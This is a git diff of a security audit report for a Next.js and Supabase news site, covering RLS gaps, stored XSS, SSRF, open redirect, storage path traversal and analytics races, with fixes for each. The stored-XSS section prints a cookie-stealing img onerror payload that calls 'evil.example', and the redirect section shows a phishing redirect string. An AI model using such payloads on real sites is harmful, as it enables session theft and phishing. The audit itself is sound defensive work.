@@ -1,359 +1,628 @@
-# Production Audit Report — WebTinTuc
+# Production Readiness Audit
 
-**Date:** 2026-07-10  
-**Stack:** Next.js 15 (App Router) · Supabase · Cloudflare R2 · Upstash Redis · Zod  
-**Scope:** Security, performance, data integrity, ops/reliability  
+**Date:** 2026-07-11  
+**Project:** WebTinTuc (Next.js 15 news platform)  
+**Scope:** Full codebase — public site, admin panel, API routes, server layer, database schema, middleware, storage, analytics, and production config  
+**Stack:** Next.js 15 App Router · React 19 · Supabase (Postgres + Auth) · Cloudflare R2 · Upstash Redis · TanStack Query · Zod  
 
-**Note:** Older docs (`docs/code-review-2026-07-02.md`) still describe auth bypass / hardcoded secrets. **Those appear fixed.** This report reflects the **current** codebase at audit time.
+**Related docs:** See also `docs/admin-panel-audit.md` for admin-UI-focused findings (some may already be fixed).
 
 ---
 
 ## Executive summary
 
-The architecture is reasonable (actions → services → repositories, validation, rate limits, analytics buffering). Auth is no longer the “wide open” state from the July review. **Several issues would still hurt production hard**, especially:
+The app has a solid layered architecture (API → actions → services → repositories), Zod validation on many inputs, cookie-based admin auth with role checks, and useful caching for public pages. **It is not production-safe yet** without addressing several high-impact security and data-integrity issues.
 
-1. Public image proxy (SSRF / abuse)
-2. Missing RLS on core tables
-3. Public CDN caching of **admin** API responses
-4. Stored XSS via HTML ads + article content
-5. Analytics flush correctness (lost / overwritten counts)
-6. Build config that can ship type errors
+The most urgent risks:
 
-**Production readiness:** not ready without addressing the Critical/High items below.
+| Area | Risk |
+|------|------|
+| **Database RLS** | Most tables have **no RLS**; with the public anon key this can mean direct PostgREST access to content and (worst case) writes |
+| **Stored XSS** | Article body blocks and ad HTML are rendered with `dangerouslySetInnerHTML` with **no sanitization** |
+| **Open SSRF** | Public `/api/image-proxy` fetches arbitrary URLs (private networks, cloud metadata, large responses) |
+| **Cron auth** | `/api/cron/flush` is **unauthenticated when `CRON_SECRET` is unset** |
+| **Cache invalidation** | Article mutations do not revalidate the public `articles` cache tag → stale public content |
+| **Analytics races** | View/click flush uses non-atomic read-modify-write; counters can under/over-count under concurrency |
+
+| Priority | Count | Themes |
+|----------|------:|--------|
+| **Critical** | 6 | RLS, XSS, SSRF, cron secret, open redirect, path traversal on storage keys |
+| **High** | 10 | Auth/secrets, rate-limit fail-open, cache tags, analytics integrity, error leakage, missing security headers |
+| **Medium** | 12 | Performance, config, incomplete features, operational gaps |
+| **Low** | 8 | Polish, DX, edge cases |
+
+**Recommendation:** Do not ship production traffic until Critical items (especially RLS + XSS + SSRF + cron) are fixed and secrets/env are verified on the host.
+
+---
+
+## Architecture snapshot
+
+```
+app/(site)/*          Public SSR pages
+app/admin/*           Admin UI (session soft-gated in middleware)
+app/api/*             Route handlers
+server/actions        Auth + validation + revalidation
+server/services       Business logic
+server/repositories   Supabase (service role) / data access
+middleware.ts         Admin gate + SEO redirects
+```
+
+**Data plane:** Almost all server data access uses `supabaseAdmin` (service role), which **bypasses RLS**. Public APIs intentionally go through the app server — but the browser also has the **anon key**, so PostgREST is a second attack surface if RLS/grants are wrong.
 
 ---
 
 ## Critical
 
-### 1. Open SSRF + bandwidth abuse — `/api/image-proxy`
+### 1. Missing Row Level Security on core tables
 
-**File:** `app/api/image-proxy/route.ts`
+**Where:** `current_schema.sql` (RLS section ~L581–616)
 
-Public, unauthenticated endpoint that `fetch`es **any** `http(s)` URL. Weak protections only:
+**What exists:** RLS is enabled only for:
 
-- Protocol check
-- Blocks same-origin loopback
-- Size cap **after** full download
-- Allows SVG (`image/svg+xml`)
+- `redirects` (public SELECT)
+- `page_stats_daily` (public SELECT)
 
-**Risks:**
+**What is missing:** No RLS (and no explicit least-privilege grants in this schema dump) for:
 
-| Risk | Detail |
-|------|--------|
-| SSRF | Probe internal IPs (`169.254.169.254`, localhost, VPC) via DNS rebinding / redirect chains |
-| Amplification | Attackers force your server to fetch large/slow remote resources |
-| XSS | Proxied SVG can execute script when rendered |
-| Cost | CPU/egress on every uncached miss |
+- `articles`, `categories`, `ads`, `profiles`
+- `article_stats_daily`, `ad_stats_daily`
+- `site_settings`
 
-**Also:** `app/api/admin/proxy-image` has the same fetch pattern (admin-only, still SSRF if an admin session or `ADMIN_API_SECRET` is stolen).
+**Impact (production):**  
+With Supabase’s default grants, anyone holding `NEXT_PUBLIC_SUPABASE_ANON_KEY` (shipped to every browser) can often call PostgREST directly, e.g.:
 
-**Fix:** Allowlist hostnames (R2/Unsplash only), block private IP ranges, disable redirects or re-validate redirect targets, reject SVG, stream with early size cutoff, rate-limit by IP.
+- Read **draft** articles, soft-deleted rows, internal stats  
+- If writes are open: insert/update/delete content, escalate `profiles.role`, inject ad HTML  
+
+App APIs using the service role are **not** a substitute for database RLS.
+
+**Fix:**
+
+1. `ENABLE ROW LEVEL SECURITY` on every public table.  
+2. Policies: anonymous/authenticated **SELECT** only for published, non-deleted public rows; **no** public INSERT/UPDATE/DELETE.  
+3. Writes only via `service_role` (your server) or tightly scoped authenticated admin policies.  
+4. `profiles`: users may read own row; only service role (or admin) updates `role`.  
+5. Verify with: anon key + `curl` against REST for draft articles / profile update.
+
+**Default role smell:** `profiles.role` defaults to `'admin'` (`current_schema.sql` L41). New profile rows must never become admin by accident — default should be `'editor'` or a non-privileged role, with admin granted explicitly.
 
 ---
 
-### 2. Incomplete RLS — most tables unprotected
+### 2. Stored XSS via article content and ad HTML
 
-**File:** `current_schema.sql` (RLS only on `redirects`, `page_stats_daily`)
+**Where:**
 
-No RLS on `articles`, `ads`, `categories`, `profiles`, `site_settings`, stats tables, etc.
+- `app/(site)/posts/[id]/page.tsx` — `dangerouslySetInnerHTML` for string HTML and block `text`/`content`
+- `components/AdBanner.tsx`, `components/MobileAdsStack.tsx` — `html_code` unsanitized
+- Admin editor: `contenteditable` + `htmlToBlocks` (`PostEditorView.tsx`, `AdminUtils.ts`) preserves raw HTML
+- Zod allows arbitrary strings in paragraph/list text and `html_code` (`article.schema.ts`, `ad.schema.ts`)
 
-The browser exposes `NEXT_PUBLIC_SUPABASE_ANON_KEY`. Client code already queries `profiles` (`lib/hooks/useAdminAuth.ts`). If Supabase defaults leave tables readable/writable to `anon`/`authenticated` without policies, **anyone can read drafts, overwrite content, or escalate roles** depending on your live Supabase config.
+**Attack path:** Compromised admin account, malicious collaborator, or any future lower-privilege editor stores:
 
-**Fix (required before prod):**
-
-- Enable RLS on **every** table
-- Public: SELECT only published + non-deleted content
-- Writes: service role / admin only
-- `profiles`: users can read own row; never allow role self-elevation
-- Verify live project matches `current_schema.sql` (schema file alone is not proof of production DB state)
-
-Default role on `profiles` is also dangerous:
-
-```sql
-"role" varchar(20) NOT NULL DEFAULT 'admin'
+```html
+<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
 ```
 
-New profiles become admins unless explicitly set otherwise.
+or a full HTML ad script. That runs for every public reader (session/cookie theft, defacement, malware drive-by).
+
+**Also:** `block.type === "iframe"` renders `<iframe src={block.src}>` with **no allowlist** (arbitrary origins) and **no sandbox**.
+
+**Fix:**
+
+1. Sanitize on **write** and **read** (defense in depth) with a strict allowlist (e.g. DOMPurify + server-side sanitize).  
+2. Strip event handlers, `javascript:` URLs, and dangerous tags (`script`, `object`, `embed`, etc.).  
+3. Restrict ad HTML to a vetted subset or serve third-party ads only via approved providers / sandboxed iframes.  
+4. Allowlist iframe hosts (YouTube, Vimeo, …) and set `sandbox` / CSP `frame-src`.  
+5. Prefer CSP (`script-src 'self'`, limited `unsafe-inline`) so residual HTML injection is harder to exploit.
 
 ---
 
-### 3. Admin API responses marked **publicly cacheable**
+### 3. Public image proxy is an open SSRF / abuse endpoint
 
-**File:** `server/http.ts` — `ok()` always sets:
+**Where:** `app/api/image-proxy/route.ts`
 
-```ts
-Cache-Control: public, s-maxage=60, stale-while-revalidate=600
-```
+**Current controls:** Requires `http://` or `https://`; blocks same-origin loopback to the app origin; 10s timeout; 10MB after download; image content-type check.
 
-**All** admin GETs use `ok()`: accounts, articles (drafts), storage trees, **signed upload/download URLs**, dashboard stats, etc.
+**Gaps:**
 
-On Vercel/Cloudflare CDN, a successful admin GET can be cached **without auth** for subsequent anonymous requests (same URL, no `Vary: Cookie` / `Authorization`).
+| Gap | Impact |
+|-----|--------|
+| No blocklist for private IPs / link-local / metadata | SSRF to `169.254.169.254`, `10.x`, `127.0.0.1`, internal hostnames |
+| DNS rebinding / redirect to internal host | Bypass naive host checks if only first URL is checked |
+| `image/svg+xml` allowed | SVG can carry scripts when opened as document |
+| No auth / no rate limit | Bandwidth and CPU abuse (proxy as free CDN/scraper) |
+| Full body buffered in memory | Memory pressure under concurrent large downloads |
+| Admin twin `app/api/admin/proxy-image/route.ts` | Same SSRF pattern (auth only; no private-IP block) |
 
-**Impact:** Leak drafts, emails, media keys, short-lived R2 signed URLs.
+**Fix:**
 
-**Fix:** Default to `private, no-store` for admin/mutation routes; only set public cache on intentional public GETs. Or split `okPublic` / `okPrivate`.
-
----
-
-### 4. Stored XSS — ads + article HTML
-
-| Location | Mechanism |
-|----------|-----------|
-| `components/AdBanner.tsx`, `MobileAdsStack.tsx` | `dangerouslySetInnerHTML` with `html_code` (no sanitization) |
-| `app/(site)/posts/[id]/page.tsx` | Paragraph/list blocks + full HTML strings via `dangerouslySetInnerHTML` |
-| Iframe blocks | Unrestricted `src` (no allowlist) |
-
-Admin-only write surface reduces risk, but any compromised admin, weak password, or future “editor” role becomes full site XSS (session theft, defacement, malware ads).
-
-**Fix:** Sanitize HTML (DOMPurify or server-side equivalent), restrict iframe to YouTube/Vimeo, avoid raw HTML ads or sandbox them in `iframe sandbox`.
+1. Resolve hostname; reject private/reserved ranges (and block redirects to them).  
+2. Optional hostname allowlist (R2, Unsplash, known CDNs) — align with `lib/image-proxy.ts`.  
+3. Disallow SVG or sanitize; never serve SVG with executable content.  
+4. Rate-limit by IP; stream with size cap before full buffer.  
+5. Prefer not exposing a general-purpose proxy at all if you control image hosts.
 
 ---
 
-### 5. Cron endpoint auth is optional
+### 4. Cron flush endpoint can run without authentication
 
-**File:** `app/api/cron/flush/route.ts`
+**Where:** `app/api/cron/flush/route.ts` L84–92
 
 ```ts
 if (secret) {
-  if (authHeader !== `Bearer ${secret}`) throw ...
+  if (authHeader !== `Bearer ${secret}`) {
+    throw new ApiError(401, ...)
+  }
 }
-// if CRON_SECRET unset → fully open
+// if CRON_SECRET is missing → no check
 ```
 
-Anyone can trigger flushes, stress Redis/Postgres, and race analytics.
+**Impact:** Anyone who discovers the URL can:
 
-**Fix:** Require `CRON_SECRET` in production; fail closed if missing. Prefer Vercel Cron + secret header.
+- Trigger heavy Redis SCAN + Postgres writes  
+- Race/corrupt analytics flush (delete Redis keys after partial writes)  
+- Amplify cost on Upstash / Supabase  
+
+`vercel.json.example` schedules `*/10 * * * *` but does not enforce secret presence.
+
+**Fix:** Fail closed: if `CRON_SECRET` is missing in production, return 503 and do not run. Always require `Authorization: Bearer …`. Prefer Vercel Cron secret verification. Document required env in `.env.example`.
+
+---
+
+### 5. Open redirect via protocol-relative `to_path`
+
+**Where:**
+
+- `server/validations/redirect.schema.ts` — `to_path` must `startsWith('/')`  
+- `middleware.ts` — `new URL(redirect.to_path, request.url)`
+
+**Issue:** Strings like `//evil.example/phish` **start with `/`**, so they pass Zod.  
+`new URL('//evil.example/phish', 'https://yoursite.com')` resolves to `https://evil.example/phish`.
+
+An admin (or attacker with admin/API access) can create a redirect used for phishing off your domain.
+
+**Fix:** Reject paths matching `//`, `/\`, encoding tricks; require `to_path` to be a single path (`/^\/(?!\/)[\w\-./?=&%]*$/` or stricter). Never allow scheme-relative URLs. Prefer relative redirect helpers that do not re-parse as absolute.
+
+---
+
+### 6. Storage key path traversal / unrestricted object keys
+
+**Where:**
+
+- `server/actions/storage.action.ts` — `folder` from FormData is unconstrained  
+- `upload-url` / `download-url` / delete / move / copy — `key` is any string (length only)  
+- `deleteFileFromR2`, `copyFileInR2`, `moveFileInR2` — no prefix allowlist
+
+**Impact:** Authenticated admin (or stolen session / `ADMIN_API_SECRET`) can:
+
+- Upload to arbitrary prefixes (`../`, absolute-looking keys)  
+- Overwrite or delete any object in the bucket  
+- Issue presigned PUT/GET for any key (1h expiry)
+
+**Fix:**
+
+1. Allowlist folders: `articles`, `ads`, `brand`, `media`, …  
+2. Normalize keys: reject `..`, leading `/`, backslashes, null bytes.  
+3. Force keys under a known prefix; never accept client-chosen absolute paths.  
+4. Validate content-type and max size on upload.  
+5. Prefer server-generated keys only (current multipart upload partially does this; presigned `key` does not).
 
 ---
 
 ## High
 
-### 6. Analytics data integrity bugs
+### 7. Rate limiting fails open and depends on optional Redis
 
-**A. Ad flush deletes Redis before Postgres write** (`app/api/cron/flush/route.ts`):
+**Where:** `server/rate-limit.ts`
+
+- Missing Upstash env → `redisCommand` returns `null` → count becomes `0` → **allowed**  
+- Exceptions → `{ allowed: true }`  
+- Used by view / impression / click APIs  
+
+**Impact:** Without Redis (or under Redis outage), analytics spam and cost amplification are unlimited. Even with Redis, spoofable `X-Forwarded-For` lets attackers rotate IPs unless the platform overwrites that header.
+
+**Fix:** In production, require Redis for mutative public analytics or use a durable fallback (e.g. short in-memory + edge rate limit). Trust only the platform’s client IP. Consider fail-closed for abuse-sensitive routes if Redis is configured but errors.
+
+---
+
+### 8. Public cache tags not revalidated on article mutations
+
+**Where:**
+
+- Public caches: `lib/api/news.ts` tags `articles`, `categories`, `ads`, `settings`  
+- Mutations: `server/actions/article.action.ts` only `revalidateTag('admin-articles')` + `dashboard` + `revalidatePath('/')` / `/admin/posts`
+
+**Impact:** After publish/update/delete:
+
+- Home feed, post detail, recommendations, category feeds can stay stale up to `revalidate: 60`  
+- `revalidatePath('/')` does **not** reliably clear `unstable_cache` for `/posts/[slug]` or category routes  
+
+Ads/categories actions revalidate `ads` / `categories`; **articles do not revalidate `articles`.**
+
+**Fix:** On every article create/update/delete/restore:
 
 ```ts
-await redisDel(key)  // then later flushAdStatsToPostgres
+revalidateTag('articles')
+revalidatePath(`/posts/${slug}`)
+// category path if category_id known
 ```
 
-Crash or DB failure ⇒ **permanent loss** of impressions/clicks.
+Same pattern for any future public-facing entities.
 
-Article views correctly flush **then** delete.
+---
 
-**B. `page_stats_daily` overwrite, not increment:**
+### 9. Analytics flush races and incomplete page-view pipeline
+
+**Where:** `server/services/analytics.service.ts`, `app/api/cron/flush/route.ts`, `incrementArticleViews`
+
+**Issues:**
+
+1. **Read → add → upsert** on `article_stats_daily` / `ad_stats_daily` is not atomic; concurrent flushes lose increments.  
+2. **Article `views`** uses the same non-atomic pattern.  
+3. Cron **DELETEs Redis keys before Postgres succeeds** for ad stats (impressions deleted at L135 even if later upsert fails).  
+4. **Page views:** flush looks for `page:views:YYYY-MM-DD` but **nothing in the codebase writes those keys** → dead code / incomplete feature.  
+5. Page flush **upserts absolute `page_views` from Redis** (overwrite), not additive — wrong if ever partially reused.
+
+**Fix:** Use SQL `INSERT … ON CONFLICT DO UPDATE SET views = table.views + EXCLUDED.views` (or RPC). Use Redis GETDEL / multi or Lua. Only delete Redis after successful write. Implement or remove page-view tracking consistently.
+
+---
+
+### 10. Internal errors returned to clients
+
+**Where:** `server/http.ts` `fail()`, `server/actions/action-result.ts`
 
 ```ts
-.upsert({ date, page_views: pageViews, ... })
+message: error instanceof Error ? error.message : 'Internal Server Error'
 ```
 
-After delete+rewrite cycles, second flush **replaces** totals with the partial Redis delta. Also: **no code writes** `page:views:*` keys (only flush exists) — dead/incomplete path.
+**Impact:** Postgres/PostgREST/R2 error strings can leak schema, constraints, or infrastructure details to attackers.
 
-**C. Non-atomic read-modify-write** in `flushArticleViewsToPostgres` / `incrementArticleViews` — concurrent flushes can under-count.
-
-**Fix:** Delete Redis only after successful write; use SQL `views = views + excluded.views`; atomic RPCs; GET→INCR multi or Lua for rate limits.
+**Fix:** Log full error server-side; return generic message for 500s. Keep specific messages only for known `ApiError` / Zod.
 
 ---
 
-### 7. Rate limiting fails open
+### 11. Weak / incomplete security headers
 
-**File:** `server/rate-limit.ts`
+**Where:** `next.config.ts` `headers()`
 
-- Missing Redis → allow all
-- Errors → allow all
-- No logging
-- `INCR` then `EXPIRE` not atomic (key can live forever without TTL)
+**Present:** HSTS (on some routes), DNS prefetch control, long cache for static assets.  
 
-Affects view fraud, ad impression/click spam, cost.
+**Missing (recommended for production):**
 
-**Fix:** Fail closed for write/analytics endpoints (or in-memory fallback); use Upstash Ratelimit SDK / pipeline; log degraded mode.
+| Header | Purpose |
+|--------|---------|
+| `Content-Security-Policy` | Mitigate XSS / third-party script |
+| `X-Content-Type-Options: nosniff` | MIME sniffing |
+| `X-Frame-Options` / `frame-ancestors` | Clickjacking |
+| `Referrer-Policy` | Limit referrer leakage |
+| `Permissions-Policy` | Camera/mic/geolocation off |
+| `Cross-Origin-Opener-Policy` | Isolate browsing context |
 
----
-
-### 8. Storage path / upload abuse (admin-authenticated)
-
-| Issue | Detail |
-|-------|--------|
-| No `..` / absolute key validation | Presigned PutObject/GetObject accept arbitrary keys |
-| No file size/MIME limits on upload action | Memory DoS via large FormData |
-| `contentType` free-form | Upload HTML/SVG as “images” |
-| 1h signed URLs | Long window if leaked |
-
-**Files:** `app/api/admin/storage/upload-url`, `download-url`, `server/services/storage.service.ts`
-
-**Fix:** Restrict key prefix, block `..`, allowlist MIME, max size, shorter expiry (5–15 min).
+Admin and API routes are largely outside the HSTS matcher pattern (`/((?!api|admin|_next).*)`) — confirm TLS/HSTS is applied at the edge (Vercel) for all hosts.
 
 ---
 
-### 9. `ignoreBuildErrors: true`
+### 12. `ADMIN_API_SECRET` is full admin equivalent
 
-**File:** `next.config.ts`
+**Where:** `server/auth.ts`
 
-Production builds can ship **with TypeScript errors**. Combined with past non-strict history, this is a real ship risk even though `tsconfig` is now `strict: true`.
+Matching `x-admin-secret` returns `{ id: 'admin-api-secret', role: 'admin' }` with **no rotation, no scope, no audit identity**.
 
-**Fix:** Set `ignoreBuildErrors: false`; make CI run `pnpm typecheck` + `pnpm build`.
+**Impact:** Single shared secret = full CMS + storage + account management. Leak in logs, client, or CI = total compromise.
 
----
-
-### 10. Missing security headers
-
-Only HSTS + DNS-Prefetch on non-API/admin routes. **No:**
-
-- Content-Security-Policy  
-- X-Frame-Options / `frame-ancestors`  
-- X-Content-Type-Options  
-- Referrer-Policy  
-- Permissions-Policy  
-
-Admin and article pages with HTML ads need CSP especially.
+**Fix:** Prefer short-lived service tokens, scoped roles (cron vs full admin), rotation policy. Never send this header from browser code (currently admin client uses cookies — good). Ensure secret is long random and only on server/cron.
 
 ---
 
-### 11. Secret comparison not constant-time; error leakage
+### 13. Build ignores TypeScript errors
 
-- `providedSecret === configuredSecret` (timing side channel — lower severity)
-- `fail()` returns raw `error.message` for non-`ApiError` failures — can leak DB/storage internals
+**Where:** `next.config.ts`
 
-**Fix:** `crypto.timingSafeEqual`; generic 500 messages in production; log details server-side only.
+```ts
+typescript: { ignoreBuildErrors: true }
+```
 
----
+**Impact:** Production builds can ship type-broken code. Runtime failures appear only under load or rare paths.
 
-### 12. Test / debug surface in production routes
-
-- `app/(site)/test-500/page.tsx` — intentional crash route  
-- README still describes **mocks as default** — operational confusion  
-
-Remove or gate `test-500` behind non-production env.
+**Fix:** Set `ignoreBuildErrors: false` (or enforce `pnpm typecheck` in CI as a required gate). Fix all type errors before release.
 
 ---
 
-## Medium — performance & scale
+### 14. Test 500 route left in the app
 
-### 13. Middleware hits Supabase on (almost) every page request
+**Where:** `app/(site)/test-500/page.tsx`
 
-**File:** `middleware.ts`
+**Impact:** Public URL that throws on every visit → noise in error tracking, possible SEO garbage, intentional client crash for visitors who find it.
 
-Redirect lookup runs for most navigations (in-memory TTL cache helps per-instance only; cold starts / multi-instance still hit DB).
-
-**Fix:** Edge config / KV for redirects, or longer shared cache (Redis).
+**Fix:** Delete for production or gate behind `NODE_ENV === 'development'`.
 
 ---
 
-### 14. Expensive fallback paths still present
+### 15. No upload size / MIME enforcement on server
 
-- Trending: RPC preferred, but fallback loads **all** `article_stats_daily` rows in range into JS  
-- Dashboard: multi-RPC with heavy fallbacks  
-- Admin search with PostgREST `.or(\`...ilike.%${search}%\`)` — special characters (`,`, `.`) can break filters; treat as injection surface for filter syntax  
+**Where:** `uploadFileToR2` / storage action
 
-**Pagination:** `common.schema` allows `limit` up to **1000** on shared schema (some public routes cap lower).
+Client may filter images; server accepts any `File` with client-provided `ContentType`, no max size.
 
----
+**Impact:** Storage cost bombs, malicious content types, very large body processing on serverless.
 
-### 15. Image proxy + Next Image double cost
-
-External images go through `/api/image-proxy` **and** Next image optimization → extra origin work and cold-start cost.
+**Fix:** Max size (e.g. 5–10MB), allowlist MIME + magic-byte check, virus scanning optional for high trust.
 
 ---
 
-### 16. Client-side admin gate is UX-only — **mitigated**
+### 16. Password policy too weak; no login rate limit in app
 
-**Files:** `lib/hooks/useAdminAuth.ts`, `middleware.ts`, `lib/supabase/middleware.ts`
+**Where:** `admin-account.schema.ts` — min password length **6**; login via Supabase password with no app-level throttle
 
-- ~~`localStorage.admin_logged_in` trusted for initial UI~~ → fail-closed: UI starts logged-out; flag is soft-only
-- ~~Network failure “trusts localStorage”~~ → errors clear flag and hide admin UI
-- ~~No middleware protection~~ → `/admin/*` requires valid Supabase session (`getUser`); `/admin` is login-only
+**Impact:** Brute force / credential stuffing on `/admin` (Supabase may have some protections; do not rely solely on them). Weak passwords for privileged users.
 
-API `requireAdmin` remains the real authorization boundary. Static JS chunks may still be downloadable (inherent client-bundle limit).
+**Fix:** Min 12+ chars, complexity or breach check; enable Supabase rate limits / CAPTCHA / MFA for admins; lockout after N failures.
 
 ---
 
-### 17. Password policy weak
+## Medium
 
-`createAccountSchema`: min password length **6**. Prefer 10–12+ and breach checks for admins.
+### 17. Middleware redirect cache is per-instance only
 
----
+**Where:** `middleware.ts` in-memory `Map`, TTL 5 minutes
 
-### 18. Env validation missing
-
-No startup schema for required env vars (`SUPABASE_*`, `R2_*`, `ADMIN_API_SECRET`, `CRON_SECRET`, Redis). Misconfig fails at runtime mid-request. Empty R2 credentials fall back to `""`.
+**Impact:** On serverless multi-instance, cache is not shared; after redirect updates, some edges serve old rules up to TTL. Acceptable for SEO redirects if admins can wait; document it. Consider short TTL or explicit purge.
 
 ---
 
-### 19. SEO / URL fallback
+### 18. Sitemap hard-capped at 1000 articles
 
-`NEXT_PUBLIC_SITE_URL ?? "https://example.com"` used in metadata, robots, sitemap, JSON-LD. Misconfigured deploys ship wrong canonicals/OG to Google.
+**Where:** `app/sitemap.ts` — `listPublicArticles({ limit: 1000 })`
 
----
+**Impact:** Sites with more published posts omit older URLs from sitemap → SEO coverage gap.
 
-### 20. Operational gaps
-
-| Gap | Risk |
-|-----|------|
-| No health/readiness endpoint | Harder load balancer / uptime checks |
-| No APM/error tracking (Sentry etc.) | Blind in prod |
-| Redis REST without timeouts | Hung analytics / rate-limit calls |
-| Cron flush N+1 Redis GETs | Slow as keys grow; needs pipeline/batch |
-| No dependency audit in CI | Supply-chain drift |
-| `vercel.json.example` only | Easy to forget cron wiring |
+**Fix:** Paginate all published articles or emit sitemap index + chunks.
 
 ---
 
-## Lower priority / positive notes
+### 19. Admin list search injects raw strings into PostgREST filters
 
-**Improvements since earlier review (good):**
+**Where:** repositories using  
+`.or(\`title.ilike.%${options.search}%\`)` etc.
 
-- Real Supabase session + profile role checks in `server/auth.ts`
-- Hardcoded admin secret removed from `adminClient.ts`
-- Zod on many inputs; layered architecture
-- Rate limits on view/impression/click
-- Indexes + dashboard RPCs in migrations
-- `strict` TypeScript enabled in `tsconfig.json`
+**Impact:** Not classic SQL injection (PostgREST parameterized), but special characters (`,`, `.`, `*`) can break filters or broaden queries unexpectedly (filter injection).
 
-**Lower severity:**
-
-- `editor` role in DB but unused (only `admin` accepted)
-- HTML ads + iframes without sandbox
-- In-memory rate-limit key race under concurrency
-- Signed URL APIs return under public cache headers (ties to #3)
+**Fix:** Escape `%`, `_`, commas, and PostgREST reserved characters; or use `textSearch` / RPC with bound params only.
 
 ---
 
-## Priority fix order (recommended)
+### 20. Homepage / category data over-fetch relative to UI
 
-| # | Item | Effort |
-|---|------|--------|
-| 1 | Admin `Cache-Control: private, no-store` | Small |
-| 2 | Require `CRON_SECRET`; fail closed | Small |
-| 3 | Lock down image-proxy (allowlist / kill if unused) | Medium |
-| 4 | Full RLS + secure profile defaults | Medium–High |
-| 5 | Fix analytics flush order + atomic increments | Medium |
-| 6 | Sanitize HTML ads/content; iframe allowlist | Medium |
-| 7 | Storage key/MIME/size limits | Small–Medium |
-| 8 | `ignoreBuildErrors: false` + CI typecheck/build | Small |
-| 9 | Security headers + CSP | Medium |
-| 10 | Rate-limit fail strategy + Redis timeouts | Medium |
-| 11 | Remove `test-500`; validate env at boot | Small |
-| 12 | Monitoring + health check | Medium |
+**Where:** `getHomeFeed` loads featured + 12 latest; category feed `limit: 50` while UI shows fewer
+
+**Impact:** Extra DB/network and payload size on TTFB. Minor today; grows with content richness (if content columns ever join incorrectly).
+
+**Fix:** Select only columns needed for cards; page size match UI.
 
 ---
 
-## Suggested “go-live” checklist
+### 21. `listPublicAds` returns full rows including `html_code`
 
-- [ ] RLS verified in **live** Supabase (not only `current_schema.sql`)
-- [ ] All secrets set: `SUPABASE_SERVICE_ROLE_KEY`, `ADMIN_API_SECRET`, `CRON_SECRET`, R2, Redis
-- [ ] Admin APIs never publicly cached
-- [ ] Image proxy restricted or removed
-- [ ] Cron authenticated and scheduled
-- [ ] Build fails on type errors
-- [ ] No debug routes
-- [ ] `NEXT_PUBLIC_SITE_URL` correct
-- [ ] Error monitoring + uptime on `/` and `/api/articles`
-- [ ] Backup/restore plan for Supabase + R2
+**Where:** `ad.repository.ts` `.select('*')`
+
+**Impact:** Larger payloads; HTML ads delivered to every page that loads ads array even if unused for a position.
+
+**Fix:** Select needed columns; split HTML ads if rare.
 
 ---
 
-## Related docs
+### 22. Environment documentation incomplete for production
 
-- `docs/code-review-2026-07-02.md` — earlier code review (partially outdated)
-- `docs/performance-audit.md` — performance-focused audit (2026-07-08)
-- `docs/frontend-api-contract.md` — frontend/backend API contract
-- `current_schema.sql` — current database schema reference
+**Where:** `.env.example` only documents mocks, API base, `ADMIN_API_SECRET`
+
+**Missing from example (used in code):**
+
+- `NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`  
+- `SUPABASE_SERVICE_ROLE_KEY`  
+- `CRON_SECRET`  
+- `UPSTASH_REDIS_REST_URL`, `UPSTASH_REDIS_REST_TOKEN`  
+- R2: `R2_ACCOUNT_ID`, `R2_ACCESS_KEY_ID`, `R2_SECRET_ACCESS_KEY`, `R2_BUCKET_NAME`, `R2_PUBLIC_URL`  
+- `NEXT_PUBLIC_SITE_URL` (defaults to `https://example.com` — **breaks SEO/canonical/OG** if unset)
+
+**Fix:** Complete `.env.example` with comments; fail startup if required secrets missing in production.
+
+---
+
+### 23. Default `NEXT_PUBLIC_SITE_URL` is example.com
+
+**Where:** layouts, sitemap, robots, post metadata
+
+**Impact:** Wrong canonicals, Open Graph URLs, JSON-LD, and sitemap host in production if env forgotten.
+
+**Fix:** Require `NEXT_PUBLIC_SITE_URL` at build/runtime for production builds.
+
+---
+
+### 24. No automated test script in package.json / CI unknown
+
+**Where:** `package.json` scripts — no `test` script; Vitest exists under `tests/`
+
+**Impact:** Easy to ship regressions; many server tests exist but may not run in deploy pipeline.
+
+**Fix:** Add `"test": "vitest run"` and gate PRs/deploys on tests + typecheck + build.
+
+---
+
+### 25. Soft-delete restore UX / media folder UX
+
+**Where:** Documented in `docs/admin-panel-audit.md` (restore UI, nested folders, logout cache). Some media upload paths appear improved (cover/ad R2 upload present in current code); re-verify before treating as closed.
+
+**Impact:** Operational mistakes (cannot restore; wrong folder prefix) → content loss perception and support load.
+
+---
+
+### 26. Account delete has no last-admin guard
+
+**Where:** `admin-account.repository.ts` `deleteAdminAccount`
+
+**Impact:** Last admin can be deleted → permanent lockout (recovery only via Supabase dashboard / service role).
+
+**Fix:** Refuse delete if it would remove the last `role = admin` profile; prevent self-delete without confirmation + another admin.
+
+---
+
+### 27. `editor` role unused / inconsistent
+
+**Schema allows `editor`; app mostly requires `role === 'admin'`.**  
+Creating non-admin users yields login “no permission” and middleware bounce to login.
+
+**Impact:** Confusing product model; accidental editor accounts unusable.
+
+**Fix:** Implement editor permissions or remove role from schema/UI until ready.
+
+---
+
+### 28. JSON-LD via `dangerouslySetInnerHTML`
+
+**Where:** layouts / post page `JSON.stringify` into script tags
+
+**Impact:** Lower risk if data is trusted; if titles/descriptions ever include `</script>`, breakout is possible.
+
+**Fix:** Replace `<` with `\u003c` in serialized JSON (common Next pattern) or use a JSON-LD component that escapes.
+
+---
+
+## Low
+
+### 29. Verbose client console logging
+
+Offline detector / view tracker / search errors log to browser console — fine for dev; reduce noise in production.
+
+### 30. `profiles` SELECT for admin check from browser
+
+Client reads `profiles` with anon key — requires at least SELECT policy for own row once RLS is on. Plan policies carefully so role checks still work.
+
+### 31. Featured home query + latest may duplicate work
+
+Featured is separate query; could use one query with ordering — micro-optimization.
+
+### 32. Rate limit window is fixed EXPIRE on first INCR
+
+Classic sliding-window approximation; if `EXPIRE` fails after first `INCR`, key can stick without TTL (rare). Use SET NX EX or Lua.
+
+### 33. Public `okCached` TTL 60s vs edge CDN
+
+Good default; document purge story for breaking news.
+
+### 34. `ignoreDuplicates` / upsert options on page_stats
+
+Dead incomplete path; remove or finish.
+
+### 35. Large `offlineImage.ts` base64 blob
+
+Inflates client bundle for offline UI — consider external asset.
+
+### 36. Admin session module cache 5 minutes
+
+Soft UI only; APIs re-check — acceptable; ensure logout clears React Query (see admin audit).
+
+---
+
+## Performance notes (production load)
+
